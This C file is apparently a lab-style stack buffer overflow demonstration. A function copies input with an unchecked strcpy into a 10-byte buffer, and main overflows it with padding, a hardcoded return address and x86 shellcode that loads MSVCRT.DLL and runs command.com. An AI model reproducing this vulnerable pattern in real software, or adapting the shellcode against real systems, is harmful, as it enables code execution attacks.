#include <stdio.h>
#include <string.h>

void fun1(char *input) { 
    char buffer[10];
    strcpy(buffer,input);
    printf("Call fun1,buffer=%s\n",buffer);
}
int main(int argc, char *argv[])
{ 
  char buffer[] = "abcdefghijklmnopqrstuvwxyz12\x12\x45\xfa\x7f"
"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"
"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6" 
"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA" 
"\x77\x1d\x80\x7c" 
"\x52\x8D\x45\xF4\x50\xFF\x55\xF0" 
"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E" 
"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4" 
"\x50\xB8" 
"\xc7\x93\xbf\x77" 
"\xFF\xD0" 
"\x83\xC4\x12\x5D";                          
  fun1(buffer);
  return 0;
}
